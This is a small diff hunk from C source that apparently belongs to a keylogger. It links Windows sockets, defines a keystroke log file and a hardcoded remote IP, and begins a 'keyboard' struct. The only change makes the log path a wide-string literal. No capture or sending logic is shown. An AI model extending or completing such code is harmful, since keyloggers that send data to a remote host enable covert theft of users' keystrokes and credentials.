@@ -9,7 +9,7 @@
 
 #pragma comment(lib, "ws2_32.lib")
 #define BUFFSIZE 1024
-# define LOGFILE		"C:\\test.txt"
+#define LOGFILE		L"C:\\test.txt"
 #define IP "10.224.34.61"
 
 struct keyboard
